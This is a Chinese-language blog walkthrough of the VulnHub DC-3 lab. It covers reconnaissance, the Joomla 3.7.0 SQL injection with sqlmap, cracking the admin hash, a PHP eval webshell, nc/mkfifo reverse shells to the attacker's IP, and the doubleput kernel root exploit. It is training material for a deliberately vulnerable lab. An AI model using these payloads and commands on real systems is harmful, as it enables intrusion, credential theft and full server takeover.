
--- 
title:  [ vulnhub靶机通关篇 ] 渗透测试综合靶场 DC-3 通关详解 (附靶机搭建教程) 
tags: []
categories: [] 

---
>  
 <h2>🍬 博主介绍</h2> 
 👨‍🎓 博主介绍：大家好，我是  ，很高兴认识大家~ ✨主攻领域：【渗透领域】【数据通信】 【通讯安全】 【web安全】【面试分析】 🎉点赞➕评论➕收藏 == 养成习惯（一键三连）😋 🎉欢迎关注💗一起学习👍一起讨论⭐️一起进步📝文末有彩蛋 🙏作者水平有限，欢迎各位大佬指点，相互学习进步！ 




#### 文章目录
- - - <ul><li>- - - - - - - <ul><li>- - - - - - - - - - - - - - - - - - - 


## 一、环境搭建：

### 1、靶场描述

```
DC-3 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.
As with the previous DC releases, this one is designed with beginners in mind, although this time around, there is only one flag, one entry point and no clues at all.
Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.
For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won't give you the answer, instead, I'll give you an idea about how to move forward.
For those with experience doing CTF and Boot2Root challenges, this probably won't take you long at all (in fact, it could take you less than 20 minutes easily).
If that's the case, and if you want it to be a bit more of a challenge, you can always redo the challenge and explore other ways of gaining root and obtaining the flag.

```

>  
 只有一个flag 


### 2、下载靶场环境

>  
 靶场下载地址： 


```
https://www.vulnhub.com/entry/dc-32,312/

```

>  
 下载下来的文件如下 


<img src="https://img-blog.csdnimg.cn/244d8f908d3844daaa1d37e5d880de6b.png" alt="在这里插入图片描述">

### 3、启动靶场环境

>  
 下载下来是虚拟机压缩文件，直接用Vmvare导入就行。 


<img src="https://img-blog.csdnimg.cn/01df19baf4504caf9e0b15241856f271.png" alt="在这里插入图片描述">

>  
 设置虚拟机名称 


<img src="https://img-blog.csdnimg.cn/7f7edd71f23d474b8018baa922f7a6c6.png" alt="在这里插入图片描述">

>  
 导入中 


<img src="https://img-blog.csdnimg.cn/3e2eaa78c06e4e40bd9bb5d1742ba4c9.png" alt="在这里插入图片描述">

>  
 导入完成之后打开后把网络模式设置为NAT模式。 


<img src="https://img-blog.csdnimg.cn/6ddd2c868a7d496d9b05248632a20cfa.png" alt="在这里插入图片描述">

>  
 开启虚拟机报错 解决办法：https://blog.csdn.net/Aluxian_/article/details/123677000 


<img src="https://img-blog.csdnimg.cn/2d04209aacef4c659bf36a8a8a57b0eb.png" alt="在这里插入图片描述">

>  
 虚拟机开启之后界面如下，我们不知道ip，需要自己探活，网段知道：192.168.233.0/24 


<img src="https://img-blog.csdnimg.cn/e8ad33b2e2f9420f96ffb30b4a3f9069.png" alt="在这里插入图片描述">

## 二、渗透靶场

### 1、目标：

>  
 目标就是我们搭建的靶场，靶场IP为：192.168.233.0/24 


<img src="https://img-blog.csdnimg.cn/1a38f3d61a5f420d89d35a7de3601202.png" alt="在这里插入图片描述">

### 2、信息收集：寻找靶机真实IP

```
nmap -sP 192.168.233.0/24

```

<img src="https://img-blog.csdnimg.cn/c44a90cae29d434a86ade18f2617fe09.png" alt="在这里插入图片描述">

>  
 本机ip为192.168.233.130 所以分析可得靶机ip为192.168.233.179 


```
192.168.233.1		vm8网卡
192.168.233.2		网关
192.168.233.179	靶机
192.168.233.254	DHCP服务器
192.168.233.130	kali本机

```

<img src="https://img-blog.csdnimg.cn/e31d3c77c2994d9d8b4295062744fe71.png" alt="在这里插入图片描述">

### 3、信息收集：探端口及服务

```
nmap -A -p- -v 192.168.233.179

```

<img src="https://img-blog.csdnimg.cn/105b5fb22fb944518d5fd1e8a4107918.png" alt="在这里插入图片描述">

>  
 发现开放了80端口，存在web服务，Apache/2.4.18，CMS为Joomla 


### 5、利用JoomScan进行扫描获取后台地址

>  
 由于我们前面采用nmap进行扫描时我们已经发现了中间件为joomla，我们可以采用joomscan进行扫描，如果我们不知道是joomla，我们可以采用目录扫描或者nikto等扫描工具进行扫描。发现更多的信息。 


#### 1.JoomScan简介

>  
 OWASPJoomla！漏洞扫描器（JoomScan）是一个开源项目，其主要目的是实现漏洞检测的自动化，以增强Joomla CMS开发的安全性。该工具基于Perl开发，能够轻松无缝地对各种Joomla项目进行漏洞扫描，其轻量化和模块化的架构能够保证扫描过程中不会留下过多的痕迹。它不仅能够检测已知漏洞，而且还能够检测到很多错误配置漏洞和管理权限漏洞等等。除此之外，OWASP JoomScan使用起来非常简单，不仅提供了非常友好的用户界面，而且还能够以HTML或文本格式导出扫描报告。 


#### 2.JoomScan简单使用

```
执行默认检测：
perl joomscan.pl --url www.example.com
perl joomscan.pl -u www.example.com

枚举已安装的组件：
perl joomscan.pl --url www.example.com --enumerate-components
perl joomscan.pl -u www.example.com –ec

设置cookie：
perl joomscan.pl --url www.example.com --cookie "test=demo;"

设置user-agent：
perl joomscan.pl --url www.example.com --user-agent "Googlebot/2.1(+http://www.googlebot.com/bot.html)"
perl joomscan.pl -u www.example.com -a "Googlebot/2.1(+http://www.googlebot.com/bot.html)"

设置随机user-agent
perl joomscan.pl -u www.example.com --random-agent
perl joomscan.pl --url www.example.com -r

更新JoomScan：
perl joomscan.pl –update

```

#### 3.joomScan扫描

```
joomscan --url http://192.168.233.179/

```

<img src="https://img-blog.csdnimg.cn/f2bc03a8036f485c82220665d25dea78.png" alt="在这里插入图片描述">

>  
 扫描结果如下 


<img src="https://img-blog.csdnimg.cn/5dc8f6407c844096857d16ce5efd0b25.png" alt="在这里插入图片描述">

>  
 知道了joomla cms版本为3.7.0 得到了网站后台地址 


```
http://192.168.233.179/administrator/

```

<img src="https://img-blog.csdnimg.cn/550816ea324045e8913a08d66f610abf.png" alt="在这里插入图片描述">

### 6、利用nikto扫描获取后台地址

#### 1.Nikto简介

>  
 Nikto是一个开源的WEB扫描评估软件，可以对Web服务器进行多项安全测试，能在230多种服务器上扫描出 2600多种有潜在危险的文件、CGI及其他问题。Nikto可以扫描指定主机的WEB类型、主机名、指定目录、特定CGI漏洞、返回主机允许的 http模式等。 


#### 2.Nikto简单使用

```
1、常规扫描
nikto -host/-h http://127.0.0.1
nikto -h http://127.0.0.1
2、可以指定端口进行扫描，同样可以指定SSL协议，进行HTTPS扫描。
nikto -h http:// 127.0.0.1 -p 443 ssl
3、指定子目录进行目录爆破
nikto -h http:// 127.0.0.1 -C /dvwa
4、批量扫描
nikto -host list.txt
5、升级更新插件
nikto -update
6、查看工具版本和插件版本
nikto -V
7、查看插件信息
nikto -list-plugins
8、命令查看帮助信息
nikto 
9、查看更详细的帮助信息
nikto -H
man nikto 

```

#### 3.Nikto扫描

>  
 我们前面已经知道了CMS是joomla，并且知道了后台地址，针对于这一个靶场这一步没有任何意义，这里只是提供一个思路，目录扫描，这里就不拓展了。 


```
nikto --url http://192.168.233.179/

```

<img src="https://img-blog.csdnimg.cn/953a4d17cc9c410c809daac4c43df132.png" alt="在这里插入图片描述">

>  
 得到了网站后台地址 


```
http://192.168.233.179/administrator/

```

### 7、查找漏洞发现存在SQL注入

>  
 我们前面知道了CMS为joomla，版本为3.7.0 使用searchsploit检查到有对应的漏洞 


```
searchsploit joomla 3.7.0

```

>  
 我们发现有一个SQL注入，还存在一个XSS 


<img src="https://img-blog.csdnimg.cn/e1c26d423b0b4b038e1a8bee9ebd312e.png" alt="在这里插入图片描述">

>  
 我们可以看一下这个漏洞的提示信息 Kali的exploits路径为/usr/share/exploitdb/exploits Joomla3.7.0 exp信息路径为php/webapps/42033.txt 


```
cat /usr/share/exploitdb/exploits/php/webapps/42033.txt

```

>  
 提示信息如下 


```
# Exploit Title: Joomla 3.7.0 - Sql Injection
# Date: 05-19-2017
# Exploit Author: Mateus Lino
# Reference: https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
# Vendor Homepage: https://www.joomla.org/
# Version: = 3.7.0
# Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux
# CVE : - CVE-2017-8917


URL Vulnerable: http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml%27


Using Sqlmap:

sqlmap -u "http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]


Parameter: list[fullordering] (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (DUAL)
    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)

    Type: error-based
    Title: MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)

    Type: AND/OR time-based blind
    Title: MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)
Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))GDiu) 

```

<img src="https://img-blog.csdnimg.cn/9fa7fa1ce6a74ffa9e75019938e75ae7.png" alt="在这里插入图片描述">

>  
 我们看到了POC，我们验证一下，把localhost修改为我们的靶机IP就ok 


```
http://192.168.233.179/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml%27

```

>  
 看到提示，数据库语句错误，说明进行了拼接，存在SQL注入 


<img src="https://img-blog.csdnimg.cn/adb4e0c562b84016988767b21ed9df64.png" alt="在这里插入图片描述">

### 8、sqlmap跑出数据

#### 1.跑出所有数据库

```
sqlmap -u "http://192.168.233.179/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]

```

<img src="https://img-blog.csdnimg.cn/eaf0fe31e3c64950b82f7e0b6e64421e.png" alt="在这里插入图片描述">

>  
 扫描结果 成功把数据库跑出来了 


```
information_schema
joomladb
mysql
performance_schema
sys

```

<img src="https://img-blog.csdnimg.cn/f70aa4f57d0b442db40e6c4c3ba2eb70.png" alt="在这里插入图片描述">

#### 2.获取当前数据库的名字joomladb

```
sqlmap -u "http://192.168.233.179/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] --current-db

```

<img src="https://img-blog.csdnimg.cn/25a34fd5d6ee4cdb95547f4192f9c19b.png" alt="在这里插入图片描述">

>  
 跑出来当前使用数据库为joomladb 


<img src="https://img-blog.csdnimg.cn/e4664f68ac8844549bf810dd63f75541.png" alt="在这里插入图片描述">

#### 3.获取获取joomladb的表名

```
sqlmap -u "http://192.168.233.179/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 -p list[fullordering] -D "joomladb" --tables

```

<img src="https://img-blog.csdnimg.cn/987d146cc21943e198101e4c856bdd05.png" alt="在这里插入图片描述">

>  
 跑出76张表 <img src="https://img-blog.csdnimg.cn/7990f10f502f413bbd38a8d369bd5c8b.png" alt="在这里插入图片描述"> 


```
Database: joomladb
[76 tables]
+---------------------+
| #__assets           |
| #__associations     |
| #__banner_clients   |
| #__banner_tracks    |
| #__banners          |
| #__bsms_admin       |
| #__bsms_books       |
| #__bsms_comments    |
| #__bsms_locations   |
| #__bsms_mediafiles  |
| #__bsms_message_typ |
| #__bsms_podcast     |
| #__bsms_series      |
| #__bsms_servers     |
| #__bsms_studies     |
| #__bsms_studytopics |
| #__bsms_teachers    |
| #__bsms_templatecod |
| #__bsms_templates   |
| #__bsms_timeset     |
| #__bsms_topics      |
| #__bsms_update      |
| #__categories       |
| #__contact_details  |
| #__content_frontpag |
| #__content_rating   |
| #__content_types    |
| #__content          |
| #__contentitem_tag_ |
| #__core_log_searche |
| #__extensions       |
| #__fields_categorie |
| #__fields_groups    |
| #__fields_values    |
| #__fields           |
| #__finder_filters   |
| #__finder_links_ter |
| #__finder_links     |
| #__finder_taxonomy_ |
| #__finder_taxonomy  |
| #__finder_terms_com |
| #__finder_terms     |
| #__finder_tokens_ag |
| #__finder_tokens    |
| #__finder_types     |
| #__jbsbackup_timese |
| #__jbspodcast_times |
| #__languages        |
| #__menu_types       |
| #__menu             |
| #__messages_cfg     |
| #__messages         |
| #__modules_menu     |
| #__modules          |
| #__newsfeeds        |
| #__overrider        |
| #__postinstall_mess |
| #__redirect_links   |
| #__schemas          |
| #__session          |
| #__tags             |
| #__template_styles  |
| #__ucm_base         |
| #__ucm_content      |
| #__ucm_history      |
| #__update_sites_ext |
| #__update_sites     |
| #__updates          |
| #__user_keys        |
| #__user_notes       |
| #__user_profiles    |
| #__user_usergroup_m |
| #__usergroups       |
| #__users            |
| #__utf8_conversion  |
| #__viewlevels       |
+---------------------+

```

>  
 观察表名，很明显，我们会关注#__users这张表 


#### 4.获取joomladb的users表的字段名

```
sqlmap -u "http://192.168.233.179/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 -p list[fullordering] -D "joomladb" --tables -T "#__users" --columns

```

<img src="https://img-blog.csdnimg.cn/f9c8fda85e8b485582d0d1cbbc886f13.png" alt="在这里插入图片描述">

>  
 第一个选项，直接回车使用默认的“Y” 


<img src="https://img-blog.csdnimg.cn/5cd721b24dbf4b82bef2ee3b2fd6eb8e.png" alt="在这里插入图片描述">

>  
 第二个选项，使用“y”，不要使用默认的，不然会出错 


<img src="https://img-blog.csdnimg.cn/4edf001951094a1585f60172a6989a44.png" alt="在这里插入图片描述">

>  
 第三个选项随意 


<img src="https://img-blog.csdnimg.cn/98c0bda70fbb477f989e15b36c3b70dc.png" alt="在这里插入图片描述">

>  
 第四个选项使用10线程 


<img src="https://img-blog.csdnimg.cn/61ac11071b294c72ab1483064a1cd2b0.png" alt="在这里插入图片描述">

>  
 最终跑出来6个字段 


<img src="https://img-blog.csdnimg.cn/db1e62ad3c9f46c49441e2f775b17cbb.png" alt="在这里插入图片描述">

```
Database: joomladb
Table: #__users
[6 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| email    | non-numeric |
| id       | numeric     |
| name     | non-numeric |
| params   | non-numeric |
| password | non-numeric |
| username | non-numeric |
+----------+-------------+

```

#### 5.获取目标字段username和password

```
sqlmap -u "http://192.168.233.179/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 -p list[fullordering] -D "joomladb" --tables -T "#__users" --columns -C "username,password" --dump

```

<img src="https://img-blog.csdnimg.cn/ccc684966fa44a028f7e8bb9f36e2aae.png" alt="在这里插入图片描述">

>  
 获得结果如下 拿到一个用户名和加密的密码 


```
Database: joomladb
Table: #__users
[1 entry]
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| admin    | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu |
+----------+--------------------------------------------------------------+

```

<img src="https://img-blog.csdnimg.cn/d656835def8047b1ae26c2dc9384d67e.png" alt="在这里插入图片描述">

### 9.利用john爆破密码snoopy

>  
 使用john破解出admin密码，john the ripper是一款本地密码破解工具，可以从我们上面生成的shadow文件（密码散列）中破解出密码。破解时间取决于密码的复杂程度以及破解模式。 创建一个admin_pass.txt，把加密的密码字段写入 


<img src="https://img-blog.csdnimg.cn/44b5e6a5fe214d64810646d8336b8213.png" alt="在这里插入图片描述">

>  
 使用john破解出admin密码是snoopy 


```
john admin_pass.txt

```

<img src="https://img-blog.csdnimg.cn/5308d19b157e41e2b4b1b2f9199c5ed8.png" alt="在这里插入图片描述">

### 10.利用获取到的账号密码进行登录

```
http://192.168.233.179/administrator/
admin/snoopy

```

<img src="https://img-blog.csdnimg.cn/1fef0fd994ea4324b9010f6b22ec81cb.png" alt="在这里插入图片描述">

>  
 登陆成功 


<img src="https://img-blog.csdnimg.cn/0e53b3e739f34aa69ce11e2fee1739cf.png" alt="在这里插入图片描述">

>  
 进入主页 


```
http://192.168.233.179/

```

>  
 他告诉我们这次DC-3实战只有一个目标获得root权限 


<img src="https://img-blog.csdnimg.cn/a9e9924ab7c243cf827613676a57e847.png" alt="在这里插入图片描述">

### 11.上传webshell

>  
 发现一个上传点 


<img src="https://img-blog.csdnimg.cn/298a92f09ddb49d18562e2a58c39a323.png" alt="在这里插入图片描述">

>  
 点击Beez3 Details and Files进入 


<img src="https://img-blog.csdnimg.cn/4ab5b266c6c2480694a99d2f5b3a963c.png" alt="在这里插入图片描述">

>  
 点击newfiles 


<img src="https://img-blog.csdnimg.cn/3b1419e492d64e0ca4c2220b69911f5b.png" alt="在这里插入图片描述">

>  
 这儿我们发现可以上传文件，考虑上传木马，也可以创建文件进行编辑 


<img src="https://img-blog.csdnimg.cn/7d7c24f44b0148edbd035f73f708b76d.png" alt="在这里插入图片描述">

>  
 要上传木马，我们先要找到当前文件所在的目录： 


```
http://192.168.159.141/templates/beez3/html/

```

<img src="https://img-blog.csdnimg.cn/8f220c04077749b1a70d9c4341ae586a.png" alt="在这里插入图片描述">

>  
 回到刚才的页面点击new file 在html下创建一个php文件，名字叫做powershell 


<img src="https://img-blog.csdnimg.cn/e0d1f5689e5c445ea345af8d834e3b0d.png" alt="在这里插入图片描述">

>  
 创建成功之后，跳到编辑页面，然后我们输入php一句话，点击左上角绿色的save进行保存 


```
&lt;?php
echo ("密码是powershell") ;
@eval($_ REQUEST [powershell] ) ;
?&gt;

```

<img src="https://img-blog.csdnimg.cn/262970106ba94b74872e08a5e26726e0.png" alt="在这里插入图片描述">

>  
 再次访问http://192.168.233.179/templates/beez3/html/ 发现多了一个powershell.php文件，我们访问一下 


<img src="https://img-blog.csdnimg.cn/533212dcc7a4453297899e314767791a.png" alt="在这里插入图片描述">

>  
 访问webshell，得到我们设置的会先内容，文件上传成功 


```
http://192.168.233.179/templates/beez3/html/powershell.php

```

<img src="https://img-blog.csdnimg.cn/c5f565e9d0d14a63bcde738b69944f93.png" alt="在这里插入图片描述">

### 12.蚁剑管理webshell

>  
 右键添加数据 


<img src="https://img-blog.csdnimg.cn/e5b7b3d195504f818364668214f2029d.png" alt="在这里插入图片描述">

>  
 输入webshell地址和连接密码 


```
http://192.168.233.179/templates/beez3/html/powershell.php
powershell

```

<img src="https://img-blog.csdnimg.cn/fc9951d3c05a48ffaf28b787a8af4a98.png" alt="在这里插入图片描述">

>  
 右键进入虚拟终端 


<img src="https://img-blog.csdnimg.cn/52c4e9ae51954c33b95fbdf5417cb19b.png" alt="在这里插入图片描述">

>  
 执行whaomi查询我权限，是www-data权限 


<img src="https://img-blog.csdnimg.cn/3fc5de46c7af4da4a9875586cf3f7554.png" alt="在这里插入图片描述">

### 13.反弹shell到kali

>  
 蚁剑看到的终端不如kali清晰，反弹一个shell到kali 


#### 1.kali监听

>  
 nc -lvvp 55555 


<img src="https://img-blog.csdnimg.cn/24926ba9ed9e4fc6b1d117105fcaddd5.png" alt="在这里插入图片描述">

#### 2.靶机连接

```
nc -e /bin/bash 192.168.233.130 55555

```

>  
 发现-e参数不可用 


<img src="https://img-blog.csdnimg.cn/21bceb44e6ac4446af50a5b4d9c4815b.png" alt="在这里插入图片描述">

>  
 使用如下目录连接 


```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.233.130 55555 &gt;/tmp/f

```

<img src="https://img-blog.csdnimg.cn/9dd1c23019ae40dd8e4fd2e8b946b4ca.png" alt="在这里插入图片描述">

#### 3.shell成功反弹

<img src="https://img-blog.csdnimg.cn/423e27cd77e2498f859c2d8191b22792.png" alt="在这里插入图片描述">

### 14.创建交互式shell

>  
 经常用shell的小伙伴都知道这个shell不好用，我们建立一个交互式shell 常用的就是python创建交互式shell 


```
python3 -c 'import pty; pty.spawn("/bin/bash")'

```

>  
 交互式shell创建成功 


<img src="https://img-blog.csdnimg.cn/63e5d945dadf4153a4f684aadeea592e.png" alt="在这里插入图片描述">

### 15.使用辅助脚本发现提权漏洞

#### 1.下载辅助脚本Linux-Exploit-Suggester.sh

>  
 下载地址： 


```
https://github.com/mzet-/linux-exploit-suggester

```

#### 2.上传辅助脚本

>  
 我们直接在蚁剑中上传 


<img src="https://img-blog.csdnimg.cn/0f9665d099cf40c28996cc041096f402.png" alt="在这里插入图片描述">

>  
 上传成功 


<img src="https://img-blog.csdnimg.cn/e1fed443790c4626a4238954f34dc3cf.png" alt="在这里插入图片描述">

#### 3.发现漏洞

```
ls -l linux-exploit-suggester

```

>  
 发现没有执行权限，我们给他加个执行文件 


```
chmod +x linux-exploit-suggester 

```

<img src="https://img-blog.csdnimg.cn/7a327935acff400babfa72a21c919594.png" alt="在这里插入图片描述">

>  
 执行脚本 


```
./inux-exploit-suggester

```

>  
 发现很多可利用漏洞 


<img src="https://img-blog.csdnimg.cn/5a547b9c2dd748a99979037a3b24adee.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/117e439ea9474e76abf2b6de37191aa1.png" alt="在这里插入图片描述"> <img src="https://img-blog.csdnimg.cn/ac8cc12e32e1440cbd06f61906cf1f0e.png" alt="在这里插入图片描述"> <img src="https://img-blog.csdnimg.cn/79ccc4c7ba114075a4cfefbf892f3424.png" alt="在这里插入图片描述">

### 15.使用辅助脚本提权

#### 1.获取提权脚本

>  
 上面发现了很多漏洞，这里我们挑一个进行提权 挑选CVE-2016-4557 


<img src="https://img-blog.csdnimg.cn/f2a1d70aeb0d46b6924223c5cda31375.png" alt="在这里插入图片描述">

>  
 在图片里可以看到是一个39772的文件，由于给出的那个URL无法下载 也可以直接下载我这里提前下载好的 


```
https://pan.baidu.com/s/1Syct4OjCO5PWaEQm6EZ1Ow?pwd=u9r7

```

>  
 也可以去searchsploit里面去看看 


<img src="https://img-blog.csdnimg.cn/24273d4fa5fb4d6c95a74573a1fdabfe.png" alt="在这里插入图片描述">

```
cat /usr/share/exploitdb/exploits/linux/local/39772.txt

```

>  
 查看文件内容，发现39772.zip下载链接 


<img src="https://img-blog.csdnimg.cn/847f18768df84f19bb63b30e235fb51e.png" alt="在这里插入图片描述"> <img src="https://img-blog.csdnimg.cn/193978a7e1c3448b8942fb013e808f54.png" alt="在这里插入图片描述">

#### 2.上传39772.zip文件

>  
 再次使用中国蚁剑上传文件，然后kali操作文件，要一步步进入到文件用法中提到的/ebpf_mapfd_doubleput目录下 kali右键，上传文件，选择刚刚下载的39772.zip进行上传 


<img src="https://img-blog.csdnimg.cn/a8d593a46775436ba90d9844f2180974.png" alt="在这里插入图片描述">

>  
 文件上传成功 


<img src="https://img-blog.csdnimg.cn/3b46928e10d5421c9ab36cb34d6f77b7.png" alt="在这里插入图片描述">

#### 3.提权

>  
 解压文件 


```
unzip 39772.zip

```

<img src="https://img-blog.csdnimg.cn/0d06caf75b6f402f87b0d769b3fa5351.png" alt="在这里插入图片描述">

```
cd 33792
ls

```

<img src="https://img-blog.csdnimg.cn/bfbde325c8f44990ae05cb91dccc2826.png" alt="在这里插入图片描述">

```
tar -xvf exploit.tar
cd ebpf_mapfd_doubleput_exploit

```

<img src="https://img-blog.csdnimg.cn/7824d164753341db89e98bacf41d09f5.png" alt="在这里插入图片描述">

```
./compile.sh
./doubleput

```

>  
 执行完之后，提权成功 


<img src="https://img-blog.csdnimg.cn/00fcaf26f51a42939b07353b308ec6b9.png" alt="在这里插入图片描述">

>  
 获得root权限 


<img src="https://img-blog.csdnimg.cn/830accbf5e6b4f609b44994ec9c74d2f.png" alt="在这里插入图片描述">

### 16.发现the-flag.txt

```
ls
cat the-flag.txt

```

<img src="https://img-blog.csdnimg.cn/2a8788bdb297404a8e529634be60cb53.png" alt="在这里插入图片描述">

## 三、相关资源

           
